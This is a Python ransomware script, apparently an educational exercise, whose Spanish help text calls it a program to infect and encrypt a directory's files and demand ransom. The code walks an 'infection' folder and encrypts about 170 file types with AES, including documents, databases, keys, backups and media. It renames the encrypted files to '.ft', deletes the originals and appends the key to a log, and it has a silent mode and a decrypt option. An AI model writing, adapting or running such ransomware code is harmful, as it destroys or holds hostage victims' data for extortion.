import os
import argparse
import argparse
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

extensiones = [".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
                ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb",
                ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat", ".ps1", ".vbs",
                ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg",
                ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw",
                ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx",
                ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb",
                ".eml", ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw", ".xlsb",
                ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm", ".docb", ".docx", ".doc"] #



def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    encrypted_file_path = file_path + '.ft'
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)
    os.remove(file_path)


def encrypt_directory(directory_path, key, silent=False):
    for root, subdir, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            extension = os.path.splitext(file_path)[1].lower()
            if extension in extensiones:
                encrypt_file(file_path, key)
            if not silent:
                print(f"Encrypted: {file_path}")


def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_data = unpad(cipher.decrypt(data), AES.block_size)
    decrypted_file_path = file_path[:-3]
    with open(decrypted_file_path, 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)
    os.remove(file_path)


def decrypt_directory(directory_path, key, silent=False):
    for root, subdir, files in os.walk(directory_path):
        for file in files:
            if file.endswith('.ft'):
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)
                if not silent:
                    print(f"Decrypted: {file_path}")


def encrypt_infection_directory(directory_path, key, silent=False):
    if not silent:
        print("Encrypting files...")
    encrypt_directory(directory_path, key, silent)
    if not silent:
        print("Encryption completed.")


def decrypt_infection_directory(directory_path, key, silent=False):
    if not silent:
        print("Decrypting files...")
    decrypt_directory(directory_path, key, silent)
    if not silent:
        print("Decryption completed.")


def get_program_version():
    return "Version 1.0"

def save_key_to_file(key):
    with open('keys.txt', 'a') as file:
        file.write(key + '\n')

def main():
    parser = argparse.ArgumentParser(description='Programa para infectar archivos de un directorio y encriptarlos. Pedir rescate con 2 cojones!!')
    parser.add_argument('-s', '--silent', action='store_true', help='Ejecuta el programa en modo silencioso')
    parser.add_argument('-r', '--decrypt', action='store_true', help='Desencripta los archivos infectados')
    parser.add_argument('-v', '--version', action='store_true', help='Muestra la version del programa')
    parser.add_argument('key', nargs='?', type=str, default='', help='clave de encriptado (tiene que tener más de 16 caracteres)')
    args = parser.parse_args()

    if args.version:
        print(get_program_version())
        return
    if not args.key:
        print('Error: La clave de encriptado es necesaria.')
        return
    if len(args.key) < 16:
        print('Error: La clave de encriptado tiene que tener como minimo 16 caracteres.')
        return
    if any(char not in string.printable for char in args.key):
        print('Error: La clave de encriptado contiene caracteres no permitidos.')
        return
    if not args.decrypt:
        encrypt_infection_directory('infection', args.key, args.silent)
        save_key_to_file(args.key)
    else:
        decrypt_infection_directory('infection', args.key, args.silent)



if __name__ == '__main__':
    main()
